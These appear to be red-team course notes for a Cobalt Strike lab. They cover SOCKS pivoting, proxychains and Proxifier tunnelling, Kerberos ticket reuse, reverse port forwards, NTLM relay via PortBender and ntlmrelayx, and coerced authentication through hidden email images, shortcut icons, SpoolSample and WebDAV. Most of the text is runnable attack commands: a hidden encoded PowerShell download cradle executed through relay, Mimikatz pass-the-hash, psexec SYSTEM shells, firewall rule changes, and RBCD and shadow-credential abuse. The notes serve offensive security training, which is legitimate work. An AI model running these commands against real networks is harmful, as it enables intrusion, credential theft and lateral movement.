# SOCKS Proxies

SOCKS (short for Socket Secure) Proxy exchanges network packets between a client and a server. Commonly used in web proxies (browser connects to the proxy, which relays requests to the website and back to the browser). Can turn a C2 server into a SOCKS proxy to tunnel external tooling into an internal network.

This is particularly helpful when we want to leverage toolsets such as [Impacket](https://github.com/SecureAuthCorp/impacket). Windows doesn't run Python natively, so being able to execute a tool on our own system and tunnel the traffic through Beacon expands our arsenal. Also, since it doesn't require tooling on the target or even executing any code on a compromised endpoint, it's stealthy.

Cobalt Strike has both a SOCKS4a and SOCKS5 proxy. SOCKS5 supports authentication and has some additional logging capabilities. Use the socks command on the Beacon that you want to act as the pivot point.

* SOCKS4: ```beacon> socks 1080```
* SOCKS5: ```beacon> socks 1080 socks5 disableNoAuth myUser myPassword enableLogging```

Port 1080 is now bound on the team server VM:

  attacker@ubuntu ~> sudo ss -lpnt
  State    Recv-Q   Send-Q     Local Address:Port        Peer Address:Port   Process
  LISTEN   0        128                    *:1080                   *:*       users:(("TeamServerImage",pid=687,fd=13))

enableLogging sends logs such as authentication failures to the VM console, which is hard to see when the team server runs as a service; use journalctl in that case.

It's bound on all interfaces so any device that has access to the team server VM may interact with the SOCKS traffic. Even though this should not be the case, the use of SOCKS5 gives an additional layer of protection.

The speed at which data moves through the proxy is determined by the sleep time of the Beacon. Remember the quality of life vs stealth trade-off. Some tools may timeout and fail with longer sleep times.

## Linux Tools

proxychains is a tool which acts as a wrapper around other applications to tunnel their traffic over a socks proxy.  First, we need to modify its configuration file to point to our Cobalt Strike socks proxy.

attacker@ubuntu ~> sudo vim /etc/proxychains.conf

At the bottom of the file: a default entry for SOCKS4. Change to match the settings of the proxy in Beacon, e.g.:

    SOCKS4:  socks4 127.0.0.1 1080
    SOCKS5:  socks5 127.0.0.1 1080 myUser myPassword

To tunnel a tool through proxychains: 

    attacker@ubuntu ~> proxychains <tool> <tool args>
    attacker@ubuntu ~> proxychains nmap -n -Pn -sT -p445,3389,4444,5985 10.10.122.10

Or from WSL on Windows:

    ubuntu@DESKTOP-3BSK7NO ~ > proxychains wmiexec.py DEV/jking@10.10.122.30

ICMP and SYN scans cannot be tunnelled, so disable ping discovery (-Pn) and specify TCP scans (-sT) in nmap.

## Windows Tools

Can also tunnel traffic from Windows using [Proxifier](https://www.proxifier.com). To create a new proxy entry:

1: Profile > Proxy Servers. Click Add and enter the relevant details.

2: When asked to use this proxy by default, select No. 

3: When prompted to go to the Proxification Rules, select Yes. Enter which applications to proxy and under what conditions.

4: Click Add to create a new rule and use the following:

    Name:          Tools
    Applications:  Any
    Target hosts:  10.10.120.0/24;10.10.122.0/23
    Target ports:  Any
    Action:        Proxy SOCKS5 10.10.5.50

5: To enable authentication to occur over the proxy, an application needs to be launched as a user from the target domain; use ```runas /netonly``` or Mimikatz.

E.g.: AD Users and Computers (ADUC); the file responsible for launching ADUC is dsa.msc, which is a snap-in for mmc.exe. Open a Command Prompt as a local admin, then launch mmc.exe via runas.

    PS C:\Users\Attacker> runas /netonly /user:DEV\bfarmer mmc.exe

Go to File > Add/Remove Snap-in, add the ADUC snap-in, then click OK. Right-click on the snap-in, select Change Domain, enter dev.cyberbotic.io and click OK. Proxifier begins to capture and relay traffic and ADUC loads the content.

Or with Mimikatz:

    mimikatz # privilege::debug
    mimikatz # sekurlsa::pth /domain:DEV /user:bfarmer /ntlm:4ea24377a53e67e78b2bd853974420fc /run:mmc.exe

PowerShell cmdlets that support credential objects can also be used.

    PS C:\Users\Attacker> $cred = Get-Credential
    PS C:\Users\Attacker> Get-ADComputer -Server 10.10.122.10 -Filter * -Credential $cred | select DNSHostName

## Pivoting with Kerberos

The above examples used both plaintext credentials (with Impacket & runas /netonly) and NTLM (with Mimikatz) to authenticate to resources over the SOCKS proxy. It is also possible to use Kerberos tickets by using Impacket through proxychains.

1: Use getTGT.py to request a TGT for jking with their AES256 hash:

    ubuntu@DESKTOP-3BSK7NO ~> proxychains getTGT.py -dc-ip 10.10.122.10 -aesKey 4a8a74daa... dev.cyberbotic.io/jking

Use the FQDN dev.cyberbotic.io rather than the NetBIOS name DEV. This will output the ticket in ccache format which can be used with other Impacket scripts. First create an environment variable ```KRB5CCNAME``` that points to the ccache file:

    ubuntu@DESKTOP-3BSK7NO ~> export KRB5CCNAME=jking.ccache

Use psexec.py to get a SYSTEM shell on WEB:

    ubuntu@DESKTOP-3BSK7NO ~> proxychains psexec.py -dc-ip 10.10.122.10 -target-ip 10.10.122.30 -no-pass -k dev.cyberbotic.io/jking@web.dev.cyberbotic.io
    C:\Windows\system32> hostname && whoami
    C:\Windows\system32> exit

With a ticket in kirbi format (from another tool) can be converted to ccache format for use with Impacket, e.g. use the TGT delegation trick to get a usable TGT for bfarmer from a non-elevated session:

    beacon> getuid
    [*] You are DEV\bfarmer
    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe tgtdeleg /nowrap

Base64 decode the ticket and write it to bfarmer.kirbi:

    ubuntu@DESKTOP-3BSK7NO ~> echo -en 'doIFzj...' | base64 -d > bfarmer.kirbi

Then convert it using ticketConverter.py:

    ubuntu@DESKTOP-3BSK7NO ~> ticketConverter.py bfarmer.kirbi bfarmer.ccache

Use this TGT to interact with the SQL-2 service:

    ubuntu@DESKTOP-3BSK7NO ~> proxychains mssqlclient.py -dc-ip 10.10.122.10 -no-pass -k dev.cyberbotic.io/bfarmer@sql-2.dev.cyberbotic.io
    SQL> select @@servername;
    SQL-2

(Might require adding a static host entry to /etc/hosts and changing the proxy_dns setting in /etc/proxychains.conf to remote_dns.)

## Browsers

Firefox with the FoxyProxy extension is ideal for pivoting a browser into the network to view internal web apps.Add a new entry in FoxyProxy that points to the Beacon SOCKS proxy:

    Proxy Type: SOCKS5
    Proxy IP address: 10.10.5.50
    Port: 1080

Then navigate to the internal web server 10.10.122.30.

Can also perform NTLM authentication following the steps outlined [here](https://offensivedefence.co.uk/posts/ntlm-auth-firefox).

## Reverse Port Forwarding

Redirects inbound traffic on a specific port to another IP and port. Allows machines to bypass firewall and other network segmentation restrictions to talk to nodes they're not allowed to (e.g. use the console of DC 2 to demonstrate that it does not have any outbound access to our team server):

    PS C:\Users\Administrator> hostname
    dc-2
    PS C:\Users\Administrator> iwr -Uri http://nickelviper.com/a
    iwr : Unable to connect to the remote server

Workstation 2 can, so can create a reverse port forward to relay traffic between DC 2 and the team server:

    beacon> rportfwd 8080 127.0.0.1 80
    [+] started reverse port forward on 8080 to 127.0.0.1:80

This binds port 8080 on Workstation 2.

    beacon> run netstat -anp tcp
    TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING

Traffic to port 8080 gets tunnelled back to the team server over the C2 channel. The team server relays the traffic to the forward host/port, then send the response back over Beacon. Then can download the file via this port forward:

    PS C:\Users\Administrator> iwr -Uri http://wkstn-2:8080/a

Windows firewall prompts with an alert when an application attempts to listen on a port that is not explicitly allowed. Allowing access requires LA privileges and clicking cancel will create an explicit block rule. So create an allow rule before the reverse port forward using either netsh or New-NetFirewallRule (adding/removing rules does not create a visible alert):

    beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

Don't be lazy by disabling the firewall.

Delete the firewall rule later by its DisplayName:

    beacon> powershell Remove-NetFirewallRule -DisplayName "8080-In"

## NTLM Relaying

NTLM authentication uses a handshake between a client and server.  The high-level steps are as follows:

1. Client makes an authentication request to Server for a resource
2. Server sends a challenge to Client
3. Client encrypts the challenge using the hash of their password, and sends the encrypted response to Server
4. Server contacts a domain controller to verify the encrypted challenge

In an NTLM relay attack, an attacker intercepts or captures this traffic and impersonates the client against a service (e.g. a client attempts to connect to Service A, but the attacker intercepts the authentication traffic and uses it to connect to Service B as though they were the client).

Windows Server 2022 domain controllers enable "Network Server: Digitally sign communications (always)" to Enabled by default, so this doesn't work against them.

During an on-prem pentest, NTLM relaying with tools like [Responder](https://github.com/lgandx/Responder) and [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/tree/master/impacket/examples/ntlmrelayx) is trivial. However, it's a different story with this style of red team assessment, not least because we can't typically run Python tools on Windows. Port 445 is always bound and in use by Windows - even local admins can't arbitrarily redirect traffic bound to this port or bind another tool to this port.

It's still possible to do with CS but requires the use of multiple capabilities simultaneously:

1. A [driver](https://reqrypt.org/windivert.html) to redirect traffic destined for port 445 to another port (e.g. 8445) to bind to.
2. A reverse port forward on the port the SMB traffic is being redirected to. This tunnels the SMB traffic over the C2 channel to the Team Server.
3. The tool of choice (e.g. ntlmrelayx) will be listening for SMB traffic on the Team Server.
4. A SOCKS proxy is to allow ntlmrelayx to send traffic back into the target network.

The flow looks something like this:

1. Origin -> Beacon: WinDivert: 445
2. Beacon: rportfwd: 8445
3. TeamServer: ntlmrelayx
4. TeamServer: socks
5. Beacon -> Target: socks

1: Ensure pre-requisites are in place before launching the actual attack. Obtain a SYSTEM beacon on the machine to capture SMB traffic on.
2: Allow those ports inbound on the Windows firewall:

    beacon> powershell New-NetFirewallRule -DisplayName "8445-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8445
    beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

3: Start two reverse port forwards: one for the SMB capture, the other for a PowerShell download cradle:

    beacon> rportfwd 8445 localhost 445
    beacon> rportfwd 8080 localhost 80

4: Start a SOCKS proxy that ntlmrelayx can use to send relay responses back into the network:

    beacon> socks 1080

5: Start ntlmrelayx.py listening for incoming connections on the Team Server. The -c parameter executes an arbitrary command on the target after authentication has succeeded:

    attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t smb://10.10.122.10 -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -enc aQBlAH...'

* 10.10.122.10 is the IP address of dc-2.dev.cyberbotic.io (target).
* The encoded command is a download cradle pointing at http://10.10.123.102:8080/b, and /b is an SMB payload.

[PortBender](https://github.com/praetorian-inc/PortBender) is a reflective DLL and aggressor script to help relaying through Cobalt Strike. It requires that the driver be located in the current working directory of the Beacon.  It makes sense to use C:\Windows\System32\drivers since this is where most Windows drivers go.

    beacon> cd C:\Windows\system32\drivers
    beacon> upload C:\Tools\PortBender\WinDivert64.sys

Then go to Cobalt Strike > Script Manager and load PortBender.cna from C:\Tools\PortBender - this adds a new PortBender command to the console.

    beacon> help PortBender
    Redirect Usage: PortBender redirect FakeDstPort RedirectedPort
    Backdoor Usage: PortBender backdoor FakeDstPort RedirectedPort Password

Execute PortBender to redirect traffic from 445 to port 8445 (breaks any legitimate SMB service on the machine):

    beacon> PortBender redirect 445 8445

To trigger the attack, coerce a user or a machine to make an authentication attempt to Workstation 2. Do it manually for the lab by using the console of Workstation 1 as the user nlamb. This user is a domain admin, so we can relay the authentication request to the domain controller.

    C:\Users\nlamb>hostname
    wkstn-1
    C:\Users\nlamb>dir \\10.10.123.102\relayme

PortBender should log the connection and ntlmrelayx will spring into action.

Link to the Beacon:

    beacon> link dc-2.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10

To stop PortBender, stop the job and kill the spawned process:

    beacon> jobs
    
     JID  PID   Description
     ---  ---   -----------
     2    5740  PortBender
    
    beacon> jobkill 2
    beacon> kill 5740

One of the main indicators of this activity is the driver load event for WinDivert. Use the "Loaded Drivers" saved search in Kibana (Sysmon Event ID 6). Although the WinDivert driver has a valid signature, seeing a unique driver load on only one machine is an anomalous event.

## Forcing NTLM Authentication

In the real world, it's unlikely to jump onto the console of a machine as a privileged user and authenticate to your malicious SMB server. Can wait for a random event, or try to socially engineer a privileged user. There are also techniques to "force" users to unknowingly trigger NTLM authentication attempts to your endpoint.

### 1x1 Images in Emails

If you have control over an inbox, you can send emails that have an invisible 1x1 image embedded in the body.  When the recipients view the email in their mail client, such as Outlook, it will attempt to download the image over the UNC path and trigger an NTLM authentication attempt.

    <img src="\\10.10.123.102\test.ico" height="1" width="1" />

A sneakier way is modify the sender's email signature so even legitimate emails they send will trigger NTLM authentications from every recipient.

### Windows Shortcuts

A Windows shortcut can have multiple properties including a target, working directory and an icon. Creating a shortcut with the icon property pointing to a UNC path triggers an NTLM authentication attempt when it's viewed in Explorer (wihtout clicking). A good location for these is on publicly readable shares. In PS:

    $wsh = new-object -ComObject wscript.shell
    $shortcut = $wsh.CreateShortcut("\\dc-2\software\test.lnk")
    $shortcut.IconLocation = "\\10.10.123.102\test.ico"
    $shortcut.Save()

### Remote Authentication Triggers

[SpoolSample](https://github.com/leechristensen/SpoolSample), [SharpSystemTriggers](https://github.com/cube0x0/SharpSystemTriggers), and [PetitPotam](https://github.com/topotam/PetitPotam) can force a computer into authenticating to us. Generally work via Microsoft RPC protocols like [MS-RPRN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1) and [MS-EFS](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/4892c610-4595-4fba-a67f-a2d26b9b6dcd).

## Relaying WebDAV

Web Distributed Authoring and Versioning (aka WebDAV) allows for basic file operations (create/copy/move/delete) over HTTP. Windows supports the use of WebDAV via Explorer where users can enter a URI or map a drive to a WebDAV server. The WebClient service facilitates Explorer's ability to use WebDAV. This is set to DEMAND_START by default, so is generally only running if a user has actively used a WebDAV resource. Some Windows technologies, such as SharePoint, use WebDAV fairly heavily.

    C:\Users\bfarmer>sc qc WebClient

WebClient exposes a named pipe called DAV RPC SERVICE, which allows to enumerate remote targets to establish whether the WebClient service is running. [GetWebDAVStatus](https://github.com/G0ldenGunSec/GetWebDAVStatus) provides C# and BOF projects that check for the presence of this named pipe:

    beacon> inline-execute C:\Tools\GetWebDAVStatus\GetWebDAVStatus_BOF\GetWebDAVStatus_x64.o wkstn-1,wkstn-2
    [+] WebClient service is active on wkstn-1
    [x] Unable to hit DAV pipe on wkstn-2, system is either unreachable or does not have WebClient service running

This shows that the service is running WKSTN-1 which makes it a target for this attack. The steps are to coerce the service into authenticating to a malicious WebDAV server that we control and then relay the authentication. We can force authentication over any port. All we need to ensure is that whatever port we choose is allowed inbound on the host firewall we're reverse port forwarding from.

The incoming authentication material will be that of the machine account. ntlmrelayx can relay this to LDAP on a domain controller to abuse either RBCD (using the --delegate-access flag) or shadow creds (using the --shadow-credentials flag). In either case, run the HTTP server on a port that will not clash with any of your HTTP listeners. This example uses port 8888:

    attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t ldaps://10.10.122.10 --delegate-access -smb2support --http-port 8888

Punch a hole in the firewall and set the reverse port forward.

    beacon> getuid
    [*] You are DEV\bfarmer (admin)
    beacon> powershell New-NetFirewallRule -DisplayName "8888-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8888
    beacon> rportfwd 8888 localhost 8888

Use SharpSystemTriggers to trigger the authentication. The WebDAV URL needs to point to the reverse port forward:

    beacon> execute-assembly SharpSpoolTrigger.exe wkstn-1 wkstn-2@8888/pwned

Once the traffic hits ntlmrelayx, it will relay to the domain controller. A new machine account PVWUMPYT$ is created with password 4!t1}}I_CGJ}0OJ, which now has delegation rights to WKSTN-1$. To complete the attack chain, calculate the AES256 hash from the password:

    PS: Rubeus.exe hash /domain:dev.cyberbotic.io /user:PVWUMPYT$ /password:'4!t1}}I_CGJ}0OJ'

Then perform the S4U2Proxy to request service tickets of your choosing:

    beacon> execute-assembly Rubeus.exe s4u /user:PVWUMPYT$ /impersonateuser:nlamb /msdsspn:cifs/wkstn-1.dev.cyberbotic.io /aes256:46B9... /nowrap

Remove the fake computer account when done.

The shadow credentials option will automatically dump a certificate file for you.

    attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t ldaps://10.10.122.10 --shadow-credentials -smb2support --http-port 8888

It can be converted to ccache format to use with Impacket, or base64 encoded to use with Rubeus.

    attacker@ubuntu ~> cat ROsU1G59.pfx | base64 -w 0

Since this is a certificate, we use it to request a TGT first which can then be used for S4U2Self:

    beacon> execute-assembly Rubeus.exe asktgt /user:WKSTN-1$ /enctype:aes256 /certificate:MIII3Q... /password:wBaP... /nowrap

Delete the keys after the attack.


